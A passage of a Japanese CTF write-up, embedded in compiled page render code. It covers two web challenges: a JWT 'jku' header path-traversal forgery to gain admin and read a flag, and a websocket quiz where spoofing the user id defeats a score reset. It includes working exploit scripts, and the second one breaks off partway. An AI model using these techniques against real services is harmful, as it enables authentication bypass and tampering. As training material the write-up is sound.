        `),n("span",{class:"token decorator annotation punctuation"},"@wraps"),n("span",{class:"token punctuation"},"("),s("f"),n("span",{class:"token punctuation"},")"),s(`
        `),n("span",{class:"token keyword"},"def"),s(),n("span",{class:"token function"},"__login_required"),n("span",{class:"token punctuation"},"("),n("span",{class:"token operator"},"*"),s("args"),n("span",{class:"token punctuation"},","),s(),n("span",{class:"token operator"},"**"),s("kwargs"),n("span",{class:"token punctuation"},")"),n("span",{class:"token punctuation"},":"),s(`
            token `),n("span",{class:"token operator"},"="),s(" request"),n("span",{class:"token punctuation"},"."),s("cookies"),n("span",{class:"token punctuation"},"."),s("get"),n("span",{class:"token punctuation"},"("),n("span",{class:"token string"},'"token"'),n("span",{class:"token punctuation"},")"),s(`
            `),n("span",{class:"token keyword"},"if"),s(),n("span",{class:"token keyword"},"not"),s(" token"),n("span",{class:"token punctuation"},":"),s(`
                `),n("span",{class:"token keyword"},"return"),s(" redirect"),n("span",{class:"token punctuation"},"("),n("span",{class:"token string"},'"/register"'),n("span",{class:"token punctuation"},")"),s(`
            user `),n("span",{class:"token operator"},"="),s(" verify_token"),n("span",{class:"token punctuation"},"("),s("token"),n("span",{class:"token punctuation"},")"),s(`
            `),n("span",{class:"token keyword"},"if"),s(" user "),n("span",{class:"token keyword"},"is"),s(),n("span",{class:"token boolean"},"None"),n("span",{class:"token punctuation"},":"),s(`
                `),n("span",{class:"token keyword"},"return"),s(" redirect"),n("span",{class:"token punctuation"},"("),n("span",{class:"token string"},'"/register"'),n("span",{class:"token punctuation"},")"),s(`
            `),n("span",{class:"token keyword"},"return"),s(" f"),n("span",{class:"token punctuation"},"("),n("span",{class:"token operator"},"*"),s("args"),n("span",{class:"token punctuation"},","),s(),n("span",{class:"token operator"},"**"),s("kwargs"),n("span",{class:"token punctuation"},","),s(" user"),n("span",{class:"token operator"},"="),s("user"),n("span",{class:"token punctuation"},")"),s(`

        `),n("span",{class:"token keyword"},"return"),s(` __login_required

    `),n("span",{class:"token keyword"},"return"),s(` _login_required

`),n("span",{class:"token keyword"},"def"),s(),n("span",{class:"token function"},"generate_token"),n("span",{class:"token punctuation"},"("),s("user_id"),n("span",{class:"token punctuation"},")"),n("span",{class:"token punctuation"},":"),s(`
    `),n("span",{class:"token keyword"},"return"),s(" jwt"),n("span",{class:"token punctuation"},"."),s("encode"),n("span",{class:"token punctuation"},"("),s(`
        `),n("span",{class:"token punctuation"},"{"),n("span",{class:"token string"},'"id"'),n("span",{class:"token punctuation"},":"),s(" user_id"),n("span",{class:"token punctuation"},"}"),n("span",{class:"token punctuation"},","),s(`
        private_key`),n("span",{class:"token punctuation"},","),s(`
        algorithm`),n("span",{class:"token operator"},"="),n("span",{class:"token string"},'"ES256"'),n("span",{class:"token punctuation"},","),s(`
        headers`),n("span",{class:"token operator"},"="),n("span",{class:"token punctuation"},"{"),n("span",{class:"token string"},'"kid"'),n("span",{class:"token punctuation"},":"),s(" KID"),n("span",{class:"token punctuation"},","),s(),n("span",{class:"token string"},'"jku"'),n("span",{class:"token punctuation"},":"),s(),n("span",{class:"token string"},'"jwks.json"'),n("span",{class:"token punctuation"},"}"),n("span",{class:"token punctuation"},","),s(`
    `),n("span",{class:"token punctuation"},")"),s(`

`),n("span",{class:"token keyword"},"def"),s(),n("span",{class:"token function"},"verify_token"),n("span",{class:"token punctuation"},"("),s("token"),n("span",{class:"token punctuation"},")"),n("span",{class:"token punctuation"},":"),s(`
    `),n("span",{class:"token keyword"},"try"),n("span",{class:"token punctuation"},":"),s(`
        header `),n("span",{class:"token operator"},"="),s(" jwt"),n("span",{class:"token punctuation"},"."),s("get_unverified_header"),n("span",{class:"token punctuation"},"("),s("token"),n("span",{class:"token punctuation"},")"),s(`
        `),n("span",{class:"token keyword"},"print"),n("span",{class:"token punctuation"},"("),n("span",{class:"token string"},'"header"'),n("span",{class:"token punctuation"},","),s(" header"),n("span",{class:"token punctuation"},")"),s(`
        jku `),n("span",{class:"token operator"},"="),s(" header"),n("span",{class:"token punctuation"},"["),n("span",{class:"token string"},'"jku"'),n("span",{class:"token punctuation"},"]"),s(`
        `),n("span",{class:"token keyword"},"print"),n("span",{class:"token punctuation"},"("),n("span",{class:"token string"},'"jku"'),n("span",{class:"token punctuation"},","),s(" jku"),n("span",{class:"token punctuation"},")"),s(`
        `),n("span",{class:"token keyword"},"with"),s(),n("span",{class:"token builtin"},"open"),n("span",{class:"token punctuation"},"("),n("span",{class:"token string-interpolation"},[n("span",{class:"token string"},'f"static/'),n("span",{class:"token interpolation"},[n("span",{class:"token punctuation"},"{"),s("jku"),n("span",{class:"token punctuation"},"}")]),n("span",{class:"token string"},'"')]),n("span",{class:"token punctuation"},","),s(),n("span",{class:"token string"},'"r"'),n("span",{class:"token punctuation"},")"),s(),n("span",{class:"token keyword"},"as"),s(" f"),n("span",{class:"token punctuation"},":"),s(`
            keys `),n("span",{class:"token operator"},"="),s(" json"),n("span",{class:"token punctuation"},"."),s("load"),n("span",{class:"token punctuation"},"("),s("f"),n("span",{class:"token punctuation"},")"),n("span",{class:"token punctuation"},"["),n("span",{class:"token string"},'"keys"'),n("span",{class:"token punctuation"},"]"),s(`
            `),n("span",{class:"token keyword"},"print"),n("span",{class:"token punctuation"},"("),n("span",{class:"token string"},'"keys"'),n("span",{class:"token punctuation"},","),s(" keys"),n("span",{class:"token punctuation"},")"),s(`
        kid `),n("span",{class:"token operator"},"="),s(" header"),n("span",{class:"token punctuation"},"["),n("span",{class:"token string"},'"kid"'),n("span",{class:"token punctuation"},"]"),s(`
        `),n("span",{class:"token keyword"},"print"),n("span",{class:"token punctuation"},"("),n("span",{class:"token string"},'"kid"'),n("span",{class:"token punctuation"},","),s(" kid"),n("span",{class:"token punctuation"},")"),s(`
        `),n("span",{class:"token keyword"},"for"),s(" key "),n("span",{class:"token keyword"},"in"),s(" keys"),n("span",{class:"token punctuation"},":"),s(`
            `),n("span",{class:"token keyword"},"if"),s(" key"),n("span",{class:"token punctuation"},"["),n("span",{class:"token string"},'"kid"'),n("span",{class:"token punctuation"},"]"),s(),n("span",{class:"token operator"},"=="),s(" kid"),n("span",{class:"token punctuation"},":"),s(`
                public_key `),n("span",{class:"token operator"},"="),s(" jwt"),n("span",{class:"token punctuation"},"."),s("algorithms"),n("span",{class:"token punctuation"},"."),s("ECAlgorithm"),n("span",{class:"token punctuation"},"."),s("from_jwk"),n("span",{class:"token punctuation"},"("),s("key"),n("span",{class:"token punctuation"},")"),s(`
                payload `),n("span",{class:"token operator"},"="),s(" jwt"),n("span",{class:"token punctuation"},"."),s("decode"),n("span",{class:"token punctuation"},"("),s("token"),n("span",{class:"token punctuation"},"."),s("encode"),n("span",{class:"token punctuation"},"("),n("span",{class:"token punctuation"},")"),n("span",{class:"token punctuation"},","),s(" public_key"),n("span",{class:"token punctuation"},","),s(" algorithms"),n("span",{class:"token operator"},"="),n("span",{class:"token punctuation"},"["),n("span",{class:"token string"},'"ES256"'),n("span",{class:"token punctuation"},"]"),n("span",{class:"token punctuation"},")"),s(`
                `),n("span",{class:"token keyword"},"return"),s(` payload
    `),n("span",{class:"token keyword"},"except"),s(" Exception"),n("span",{class:"token punctuation"},":"),s(`
        `),n("span",{class:"token keyword"},"pass"),s(`
    `),n("span",{class:"token keyword"},"return"),s(),n("span",{class:"token boolean"},"None"),s(`

`),n("span",{class:"token decorator annotation punctuation"},[s("@app"),n("span",{class:"token punctuation"},"."),s("route")]),n("span",{class:"token punctuation"},"("),n("span",{class:"token string"},'"/flag"'),n("span",{class:"token punctuation"},")"),s(`
`),n("span",{class:"token decorator annotation punctuation"},"@login_required"),n("span",{class:"token punctuation"},"("),n("span",{class:"token punctuation"},")"),s(`
`),n("span",{class:"token keyword"},"def"),s(),n("span",{class:"token function"},"get_flag"),n("span",{class:"token punctuation"},"("),s("user"),n("span",{class:"token punctuation"},")"),n("span",{class:"token punctuation"},":"),s(`
    `),n("span",{class:"token keyword"},"if"),s(" user"),n("span",{class:"token punctuation"},"["),n("span",{class:"token string"},'"id"'),n("span",{class:"token punctuation"},"]"),s(),n("span",{class:"token operator"},"=="),s(),n("span",{class:"token string"},'"admin"'),n("span",{class:"token punctuation"},":"),s(`
        `),n("span",{class:"token keyword"},"return"),s(` flag
    `),n("span",{class:"token keyword"},"else"),n("span",{class:"token punctuation"},":"),s(`
        `),n("span",{class:"token keyword"},"return"),s(),n("span",{class:"token string"},'"admins only! shoo!"'),s(`
`)])]),n("p",null,[n("img",{src:d,alt:"alt text"})]),n("p",null,"\u4EE5\u4E0B\u306E\u3088\u3046\u306A\u624B\u9806\u3067\u89E3\u3051\u305D\u3046\u3067\u3042\u308B"),n("ul",null,[n("li",null,"\u30D5\u30A1\u30A4\u30EB\u306E\u30A2\u30C3\u30D7\u30ED\u30FC\u30C9\u30DA\u30FC\u30B8\u306B\u3066\u81EA\u5206\u3067\u4F5C\u6210\u3057\u305F\u516C\u958B\u9375\u3092\u30A2\u30C3\u30D7\u30ED\u30FC\u30C9"),n("li",null,"id\u3092admin\uFF0Cjku\u3092\u30A2\u30C3\u30D7\u30ED\u30FC\u30C9\u5F8C\u306E\u516C\u958B\u9375\u306E\u30D1\u30B9\u3068\u3057\u305Fjwt\u3092\u4F5C\u6210"),n("li",null,[n("code",{class:""},"/flag"),s("\u306B\u30A2\u30AF\u30BB\u30B9")])]),n("p",null,"\u307E\u305A\u516C\u958B\u9375\u3092\u30A2\u30C3\u30D7\u30ED\u30FC\u30C9\u3057\u3066"),n("pre",{class:"language-json","v-pre":"true"},[n("code",{class:"language-json"},[n("span",{class:"token punctuation"},"{"),s(`
  `),n("span",{class:"token property"},'"keys"'),n("span",{class:"token operator"},":"),s(),n("span",{class:"token punctuation"},"["),s(`
    `),n("span",{class:"token punctuation"},"{"),s(`
      `),n("span",{class:"token property"},'"kty"'),n("span",{class:"token operator"},":"),s(),n("span",{class:"token string"},'"EC"'),n("span",{class:"token punctuation"},","),s(`
      `),n("span",{class:"token property"},'"crv"'),n("span",{class:"token operator"},":"),s(),n("span",{class:"token string"},'"P-256"'),n("span",{class:"token punctuation"},","),s(`
      `),n("span",{class:"token property"},'"x"'),n("span",{class:"token operator"},":"),s(),n("span",{class:"token string"},'"0QCXT0NvlTA9Rg6BE9YVnRGQCP9iqnalG-52qL1r_88"'),n("span",{class:"token punctuation"},","),s(`
      `),n("span",{class:"token property"},'"y"'),n("span",{class:"token operator"},":"),s(),n("span",{class:"token string"},'"5H3jm2p6Cm5lnY7aMa6bVt1YJ7rveUm1ykTfUUAecqI"'),n("span",{class:"token punctuation"},","),s(`
      `),n("span",{class:"token property"},'"kid"'),n("span",{class:"token operator"},":"),s(),n("span",{class:"token string"},'"1"'),s(`
    `),n("span",{class:"token punctuation"},"}"),s(`
  `),n("span",{class:"token punctuation"},"]"),s(`
`),n("span",{class:"token punctuation"},"}"),s(`
`)])]),n("p",null,"\u4EE5\u4E0B\u306E\u3088\u3046\u306Bjwt\u3092\u4F5C\u6210\u3057\u3066\u7D42\u308F\u308A"),n("pre",{class:"language-py","v-pre":"true"},[n("code",{class:"language-py"},[n("span",{class:"token keyword"},"import"),s(` jwt

`),n("span",{class:"token keyword"},"with"),s(),n("span",{class:"token builtin"},"open"),n("span",{class:"token punctuation"},"("),n("span",{class:"token string"},"'./es256.key.pkcs8'"),n("span",{class:"token punctuation"},")"),s(),n("span",{class:"token keyword"},"as"),s(" f_private"),n("span",{class:"token punctuation"},":"),s(`
    private_key `),n("span",{class:"token operator"},"="),s(" f_private"),n("span",{class:"token punctuation"},"."),s("read"),n("span",{class:"token punctuation"},"("),n("span",{class:"token punctuation"},")"),s(`

header `),n("span",{class:"token operator"},"="),s(),n("span",{class:"token punctuation"},"{"),s(`
    `),n("span",{class:"token string"},"'alg'"),n("span",{class:"token punctuation"},":"),s(),n("span",{class:"token string"},"'ES256'"),n("span",{class:"token punctuation"},","),s(`
    `),n("span",{class:"token comment"},"# json \u5185\u306E kid"),s(`
    `),n("span",{class:"token string"},"'kid'"),n("span",{class:"token punctuation"},":"),s(),n("span",{class:"token string"},"'1'"),n("span",{class:"token punctuation"},","),s(`
    `),n("span",{class:"token comment"},"# \u30A2\u30C3\u30D7\u30ED\u30FC\u30C9\u5F8C\u306E\u30D1\u30B9"),s(`
    `),n("span",{class:"token string"},'"jku"'),n("span",{class:"token punctuation"},":"),s(),n("span",{class:"token string"},'"../uploads/4f43ef06-30ab-4146-8327-9db6a17d2d20/64dfb478-7292-47e6-b27f-307397b82017"'),n("span",{class:"token punctuation"},","),s(`
    `),n("span",{class:"token string"},"'typ'"),n("span",{class:"token punctuation"},":"),s(),n("span",{class:"token string"},"'JWT'"),s(`
`),n("span",{class:"token punctuation"},"}"),s(`
payload `),n("span",{class:"token operator"},"="),s(),n("span",{class:"token punctuation"},"{"),s(`
    `),n("span",{class:"token string"},'"id"'),n("span",{class:"token punctuation"},":"),s(),n("span",{class:"token string"},'"admin"'),s(`
`),n("span",{class:"token punctuation"},"}"),s(`

encoded_jwt `),n("span",{class:"token operator"},"="),s(" jwt"),n("span",{class:"token punctuation"},"."),s("encode"),n("span",{class:"token punctuation"},"("),s("payload"),n("span",{class:"token punctuation"},","),s(" private_key"),n("span",{class:"token punctuation"},","),s(`
                         algorithm`),n("span",{class:"token operator"},"="),n("span",{class:"token string"},"'ES256'"),n("span",{class:"token punctuation"},","),s(" headers"),n("span",{class:"token operator"},"="),s("header"),n("span",{class:"token punctuation"},")"),s(`
`),n("span",{class:"token keyword"},"print"),n("span",{class:"token punctuation"},"("),n("span",{class:"token string"},'"encoded_jwt:"'),n("span",{class:"token punctuation"},","),s(" encoded_jwt"),n("span",{class:"token punctuation"},")"),s(`
`)])]),n("hr"),n("h1",{id:"%5Bweb%5D-kaboot",tabindex:"-1"},"[web] kaboot"),n("p",null,"\u30AF\u30A4\u30BA\u306B\u305F\u304F\u3055\u3093\u7B54\u3048\u308B\u554F\u984C\uFF0E\u30B3\u30FC\u30C9\u306F\u4EE5\u4E0B\uFF0E"),n("pre",{class:"language-py","v-pre":"true"},[n("code",{class:"language-py"},[n("span",{class:"token decorator annotation punctuation"},[s("@sock"),n("span",{class:"token punctuation"},"."),s("route")]),n("span",{class:"token punctuation"},"("),n("span",{class:"token string"},"'/room/<room_id>'"),n("span",{class:"token punctuation"},")"),s(`
`),n("span",{class:"token keyword"},"def"),s(),n("span",{class:"token function"},"room_sock"),n("span",{class:"token punctuation"},"("),s("sock"),n("span",{class:"token punctuation"},","),s(" room_id"),n("span",{class:"token punctuation"},")"),n("span",{class:"token punctuation"},":"),s(`
    sock`),n("span",{class:"token punctuation"},"."),s("send"),n("span",{class:"token punctuation"},"("),s("b64encode"),n("span",{class:"token punctuation"},"("),s("kahoot"),n("span",{class:"token punctuation"},"["),n("span",{class:"token string"},"'name'"),n("span",{class:"token punctuation"},"]"),n("span",{class:"token punctuation"},"."),s("encode"),n("span",{class:"token punctuation"},"("),n("span",{class:"token punctuation"},")"),n("span",{class:"token punctuation"},")"),n("span",{class:"token punctuation"},")"),s(`
    scores `),n("span",{class:"token operator"},"="),s(" get_room_scores"),n("span",{class:"token punctuation"},"("),s("room_id"),n("span",{class:"token punctuation"},")"),s(`
    `),n("span",{class:"token keyword"},"for"),s(" i"),n("span",{class:"token punctuation"},","),s(" q "),n("span",{class:"token keyword"},"in"),s(),n("span",{class:"token builtin"},"enumerate"),n("span",{class:"token punctuation"},"("),s("kahoot"),n("span",{class:"token punctuation"},"["),n("span",{class:"token string"},"'questions'"),n("span",{class:"token punctuation"},"]"),n("span",{class:"token punctuation"},")"),n("span",{class:"token punctuation"},":"),s(`
        sock`),n("span",{class:"token punctuation"},"."),s("send"),n("span",{class:"token punctuation"},"("),s("b64encode"),n("span",{class:"token punctuation"},"("),s("json"),n("span",{class:"token punctuation"},"."),s("dumps"),n("span",{class:"token punctuation"},"("),n("span",{class:"token punctuation"},"{"),s(`
            `),n("span",{class:"token string"},"'send_time'"),n("span",{class:"token punctuation"},":"),s(" time"),n("span",{class:"token punctuation"},"("),n("span",{class:"token punctuation"},")"),n("span",{class:"token punctuation"},","),s(`
            `),n("span",{class:"token string"},"'scores'"),n("span",{class:"token punctuation"},":"),s(" scores"),n("span",{class:"token punctuation"},","),s(`
            `),n("span",{class:"token operator"},"**"),s("q"),n("span",{class:"token punctuation"},","),s(`
        `),n("span",{class:"token punctuation"},"}"),n("span",{class:"token punctuation"},")"),n("span",{class:"token punctuation"},"."),s("encode"),n("span",{class:"token punctuation"},"("),n("span",{class:"token punctuation"},")"),n("span",{class:"token punctuation"},")"),n("span",{class:"token punctuation"},")"),s(`

        data `),n("span",{class:"token operator"},"="),s(" sock"),n("span",{class:"token punctuation"},"."),s("receive"),n("span",{class:"token punctuation"},"("),n("span",{class:"token punctuation"},")"),s(`
        data `),n("span",{class:"token operator"},"="),s(" json"),n("span",{class:"token punctuation"},"."),s("loads"),n("span",{class:"token punctuation"},"("),s("b64decode"),n("span",{class:"token punctuation"},"("),s("data"),n("span",{class:"token punctuation"},")"),n("span",{class:"token punctuation"},"."),s("decode"),n("span",{class:"token punctuation"},"("),n("span",{class:"token punctuation"},")"),n("span",{class:"token punctuation"},")"),s(`

        send_time `),n("span",{class:"token operator"},"="),s(" data"),n("span",{class:"token punctuation"},"["),n("span",{class:"token string"},"'send_time'"),n("span",{class:"token punctuation"},"]"),s(`
        recv_time `),n("span",{class:"token operator"},"="),s(" time"),n("span",{class:"token punctuation"},"("),n("span",{class:"token punctuation"},")"),s(`

        `),n("span",{class:"token keyword"},"if"),s(),n("span",{class:"token punctuation"},"("),s("scores "),n("span",{class:"token operator"},":="),s(" get_room_scores"),n("span",{class:"token punctuation"},"("),s("room_id"),n("span",{class:"token punctuation"},")"),n("span",{class:"token punctuation"},")"),s(),n("span",{class:"token keyword"},"is"),s(),n("span",{class:"token keyword"},"not"),s(),n("span",{class:"token boolean"},"None"),s(),n("span",{class:"token keyword"},"and"),s(" send_time "),n("span",{class:"token operator"},">="),s(" time"),n("span",{class:"token punctuation"},"("),n("span",{class:"token punctuation"},")"),n("span",{class:"token punctuation"},":"),s(`
            sock`),n("span",{class:"token punctuation"},"."),s("send"),n("span",{class:"token punctuation"},"("),s("b64encode"),n("span",{class:"token punctuation"},"("),s("json"),n("span",{class:"token punctuation"},"."),s("dumps"),n("span",{class:"token punctuation"},"("),n("span",{class:"token punctuation"},"{"),s(`
                `),n("span",{class:"token string"},"'scores'"),n("span",{class:"token punctuation"},":"),s(" scores"),n("span",{class:"token punctuation"},","),s(`
                `),n("span",{class:"token string"},"'end'"),n("span",{class:"token punctuation"},":"),s(),n("span",{class:"token boolean"},"True"),n("span",{class:"token punctuation"},","),s(`
                `),n("span",{class:"token string"},"'message'"),n("span",{class:"token punctuation"},":"),s(),n("span",{class:"token string"},"'???'"),s(`
            `),n("span",{class:"token punctuation"},"}"),n("span",{class:"token punctuation"},")"),n("span",{class:"token punctuation"},"."),s("encode"),n("span",{class:"token punctuation"},"("),n("span",{class:"token punctuation"},")"),n("span",{class:"token punctuation"},")"),n("span",{class:"token punctuation"},")"),s(`
            `),n("span",{class:"token keyword"},"return"),s(`

        `),n("span",{class:"token keyword"},"if"),s(" i "),n("span",{class:"token operator"},"=="),s(),n("span",{class:"token number"},"0"),n("span",{class:"token punctuation"},":"),s(`
            edit_score`),n("span",{class:"token punctuation"},"("),s("scores"),n("span",{class:"token punctuation"},","),s(" room_id"),n("span",{class:"token punctuation"},","),s(" data"),n("span",{class:"token punctuation"},"["),n("span",{class:"token string"},"'id'"),n("span",{class:"token punctuation"},"]"),n("span",{class:"token punctuation"},","),s(),n("span",{class:"token number"},"0"),n("span",{class:"token punctuation"},")"),s(`

        `),n("span",{class:"token keyword"},"if"),s(" data"),n("span",{class:"token punctuation"},"["),n("span",{class:"token string"},"'answer'"),n("span",{class:"token punctuation"},"]"),s(),n("span",{class:"token operator"},"=="),s(" q"),n("span",{class:"token punctuation"},"["),n("span",{class:"token string"},"'answer'"),n("span",{class:"token punctuation"},"]"),n("span",{class:"token punctuation"},":"),s(`
            edit_score`),n("span",{class:"token punctuation"},"("),s("scores"),n("span",{class:"token punctuation"},","),s(`
                       room_id`),n("span",{class:"token punctuation"},","),s(`
                       data`),n("span",{class:"token punctuation"},"["),n("span",{class:"token string"},"'id'"),n("span",{class:"token punctuation"},"]"),n("span",{class:"token punctuation"},","),s(`
                       get_score`),n("span",{class:"token punctuation"},"("),s("scores"),n("span",{class:"token punctuation"},","),s(" room_id"),n("span",{class:"token punctuation"},","),s(" data"),n("span",{class:"token punctuation"},"["),n("span",{class:"token string"},"'id'"),n("span",{class:"token punctuation"},"]"),n("span",{class:"token punctuation"},")"),s(),n("span",{class:"token operator"},"+"),s(),n("span",{class:"token number"},"1000"),s(),n("span",{class:"token operator"},"+"),s(),n("span",{class:"token builtin"},"max"),n("span",{class:"token punctuation"},"("),n("span",{class:"token punctuation"},"("),s("send_time "),n("span",{class:"token operator"},"-"),s(" recv_time"),n("span",{class:"token punctuation"},")"),s(),n("span",{class:"token operator"},"*"),s(),n("span",{class:"token number"},"50"),n("span",{class:"token punctuation"},","),s(),n("span",{class:"token operator"},"-"),n("span",{class:"token number"},"500"),n("span",{class:"token punctuation"},")"),n("span",{class:"token punctuation"},")"),s(`

    sock`),n("span",{class:"token punctuation"},"."),s("send"),n("span",{class:"token punctuation"},"("),s("b64encode"),n("span",{class:"token punctuation"},"("),s("json"),n("span",{class:"token punctuation"},"."),s("dumps"),n("span",{class:"token punctuation"},"("),n("span",{class:"token punctuation"},"{"),s(`
        `),n("span",{class:"token string"},"'scores'"),n("span",{class:"token punctuation"},":"),s(" scores"),n("span",{class:"token punctuation"},","),s(`
        `),n("span",{class:"token string"},"'end'"),n("span",{class:"token punctuation"},":"),s(),n("span",{class:"token boolean"},"True"),n("span",{class:"token punctuation"},","),s(`
        `),n("span",{class:"token string"},"'message'"),n("span",{class:"token punctuation"},":"),s(),n("span",{class:"token string-interpolation"},[n("span",{class:"token string"},"f'omg congrats, swiftie!!! "),n("span",{class:"token interpolation"},[n("span",{class:"token punctuation"},"{"),s("flag"),n("span",{class:"token punctuation"},"}")]),n("span",{class:"token string"},"'")]),s(),n("span",{class:"token keyword"},"if"),s(" get_score"),n("span",{class:"token punctuation"},"("),s("scores"),n("span",{class:"token punctuation"},","),s(" room_id"),n("span",{class:"token punctuation"},","),s(" data"),n("span",{class:"token punctuation"},"["),n("span",{class:"token string"},"'id'"),n("span",{class:"token punctuation"},"]"),n("span",{class:"token punctuation"},")"),s(),n("span",{class:"token operator"},">="),s(),n("span",{class:"token number"},"1000"),s(),n("span",{class:"token operator"},"*"),s(),n("span",{class:"token builtin"},"len"),n("span",{class:"token punctuation"},"("),s("kahoot"),n("span",{class:"token punctuation"},"["),n("span",{class:"token string"},"'questions'"),n("span",{class:"token punctuation"},"]"),n("span",{class:"token punctuation"},")"),s(),n("span",{class:"token keyword"},"else"),s(),n("span",{class:"token string"},"'sucks to suck brooooooooo'"),s(`
    `),n("span",{class:"token punctuation"},"}"),n("span",{class:"token punctuation"},")"),n("span",{class:"token punctuation"},"."),s("encode"),n("span",{class:"token punctuation"},"("),n("span",{class:"token punctuation"},")"),n("span",{class:"token punctuation"},")"),n("span",{class:"token punctuation"},")"),s(`
`)])]),n("p",null,"\u4EE5\u4E0B\u306E\u90E8\u5206\u3092\u8AAD\u3080\u3068\uFF0C\u30B9\u30B3\u30A2\u3092\u554F\u984C\u6570 * 1000\u70B9\u4EE5\u4E0A\u7A3C\u3052\u3070\u3044\u3044\u3053\u3068\u304C\u308F\u304B\u308B\uFF0E"),n("pre",{class:"language-py","v-pre":"true"},[n("code",{class:"language-py"},[s("sock"),n("span",{class:"token punctuation"},"."),s("send"),n("span",{class:"token punctuation"},"("),s("b64encode"),n("span",{class:"token punctuation"},"("),s("json"),n("span",{class:"token punctuation"},"."),s("dumps"),n("span",{class:"token punctuation"},"("),n("span",{class:"token punctuation"},"{"),s(`
        `),n("span",{class:"token string"},"'scores'"),n("span",{class:"token punctuation"},":"),s(" scores"),n("span",{class:"token punctuation"},","),s(`
        `),n("span",{class:"token string"},"'end'"),n("span",{class:"token punctuation"},":"),s(),n("span",{class:"token boolean"},"True"),n("span",{class:"token punctuation"},","),s(`
        `),n("span",{class:"token string"},"'message'"),n("span",{class:"token punctuation"},":"),s(),n("span",{class:"token string-interpolation"},[n("span",{class:"token string"},"f'omg congrats, swiftie!!! "),n("span",{class:"token interpolation"},[n("span",{class:"token punctuation"},"{"),s("flag"),n("span",{class:"token punctuation"},"}")]),n("span",{class:"token string"},"'")]),s(),n("span",{class:"token keyword"},"if"),s(" get_score"),n("span",{class:"token punctuation"},"("),s("scores"),n("span",{class:"token punctuation"},","),s(" room_id"),n("span",{class:"token punctuation"},","),s(" data"),n("span",{class:"token punctuation"},"["),n("span",{class:"token string"},"'id'"),n("span",{class:"token punctuation"},"]"),n("span",{class:"token punctuation"},")"),s(),n("span",{class:"token operator"},">="),s(),n("span",{class:"token number"},"1000"),s(),n("span",{class:"token operator"},"*"),s(),n("span",{class:"token builtin"},"len"),n("span",{class:"token punctuation"},"("),s("kahoot"),n("span",{class:"token punctuation"},"["),n("span",{class:"token string"},"'questions'"),n("span",{class:"token punctuation"},"]"),n("span",{class:"token punctuation"},")"),s(),n("span",{class:"token keyword"},"else"),s(),n("span",{class:"token string"},"'sucks to suck brooooooooo'"),s(`
    `),n("span",{class:"token punctuation"},"}"),n("span",{class:"token punctuation"},")"),n("span",{class:"token punctuation"},"."),s("encode"),n("span",{class:"token punctuation"},"("),n("span",{class:"token punctuation"},")"),n("span",{class:"token punctuation"},")"),n("span",{class:"token punctuation"},")"),s(`
`)])]),n("p",null,[s("\u30AF\u30A4\u30BA\u306E\u554F\u984C\u306B\u3064\u3044\u3066\u306Fwebsocket\u3067\u3084\u308A\u3068\u308A\u3092\u3057\u3066\u3044\u308B\uFF0E \u9001\u4FE1\u3059\u308Bws\u306E"),n("code",{class:""},"send_time"),s("\u3092\u672A\u6765\u306E\u6642\u9593\u306B\u6539\u3056\u3093\u3057\u3088\u3046\u3068\u3057\u305F\u5834\u5408\uFF0C"),n("code",{class:""},"if (scores := get_room_scores(room_id)) is not None and send_time >= time():"),s("\u306B\u5F15\u3063\u304B\u304B\u308B\uFF0E")]),n("p",null,"\u540C\u3058\u30E6\u30FC\u30B6\u3067\u8907\u6570\u56DE\u554F\u984C\u3092\u89E3\u304F\u3053\u3068\u3067\u70B9\u6570\u3092\u7121\u9650\u306B\u5897\u3084\u3059\u65B9\u6CD5\u3092\u8003\u3048\u305F\u304C\u4EE5\u4E0B\u3067\u5BFE\u7B56\u3055\u308C\u3066\u3044\u308B\uFF0E \u3057\u304B\u3057\uFF0C\u3053\u308C\u306F1\u554F\u76EE\u306E\u969B\u306Bid\u306B\u66F8\u304B\u308C\u305F\u30E6\u30FC\u30B6\u306E\u70B9\u6570\u3092\u30EA\u30BB\u30C3\u30C8\u3059\u308B\u3068\u3044\u3046\u4ED5\u7D44\u307F\u306B\u306A\u3063\u3066\u3044\u308B\uFF0E 1\u554F\u76EE\u3060\u3051\u30E6\u30FC\u30B6\u540D\u3092\u507D\u9020\u3059\u308C\u3070\u70B9\u6570\u304C\u30EA\u30BB\u30C3\u30C8\u3055\u308C\u308B\u3053\u3068\u306A\u304F\u7121\u9650\u306B\u5897\u3084\u305B\u305D\u3046\u3067\u3042\u308B\uFF0E"),n("pre",{class:"language-py","v-pre":"true"},[n("code",{class:"language-py"},[n("span",{class:"token keyword"},"if"),s(" i "),n("span",{class:"token operator"},"=="),s(),n("span",{class:"token number"},"0"),n("span",{class:"token punctuation"},":"),s(`
    edit_score`),n("span",{class:"token punctuation"},"("),s("scores"),n("span",{class:"token punctuation"},","),s(" room_id"),n("span",{class:"token punctuation"},","),s(" data"),n("span",{class:"token punctuation"},"["),n("span",{class:"token string"},"'id'"),n("span",{class:"token punctuation"},"]"),n("span",{class:"token punctuation"},","),s(),n("span",{class:"token number"},"0"),n("span",{class:"token punctuation"},")"),s(`
`)])]),n("p",null,"\u2193\u89E3\u7B54"),n("pre",{class:"language-py","v-pre":"true"},[n("code",{class:"language-py"},[n("span",{class:"token keyword"},"from"),s(" websocket "),n("span",{class:"token keyword"},"import"),s(` create_connection
`),n("span",{class:"token keyword"},"import"),s(` requests
`),n("span",{class:"token keyword"},"from"),s(" bs4 "),n("span",{class:"token keyword"},"import"),s(` BeautifulSoup
`),n("span",{class:"token keyword"},"from"),s(" base64 "),n("span",{class:"token keyword"},"import"),s(" b64decode"),n("span",{class:"token punctuation"},","),s(` b64encode
`),n("span",{class:"token keyword"},"import"),s(` json

`),n("span",{class:"token keyword"},"with"),s(),n("span",{class:"token builtin"},"open"),n("span",{class:"token punctuation"},"("),n("span",{class:"token string"},"'./kahoot.json'"),n("span",{class:"token punctuation"},")"),s(),n("span",{class:"token keyword"},"as"),s(" f"),n("span",{class:"token punctuation"},":"),s(`
    kahoot `),n("span",{class:"token operator"},"="),s(" json"),n("span",{class:"token punctuation"},"."),s("load"),n("span",{class:"token punctuation"},"("),s("f"),n("span",{class:"token punctuation"},")"),s(`

HOST `),n("span",{class:"token operator"},"="),s(),n("span",{class:"token string"},"'kaboot-8415d871f0ea1f31.tjc.tf'"),s(`
url `),n("span",{class:"token operator"},"="),s(),n("span",{class:"token string-interpolation"},[n("span",{class:"token string"},'f"https://'),n("span",{class:"token interpolation"},[n("span",{class:"token punctuation"},"{"),s("HOST"),n("span",{class:"token punctuation"},"}")]),n("span",{class:"token string"},'/create"')]),s(`
uid `),n("span",{class:"token operator"},"="),s(),n("span",{class:"token string"},"'evip'"),s(`

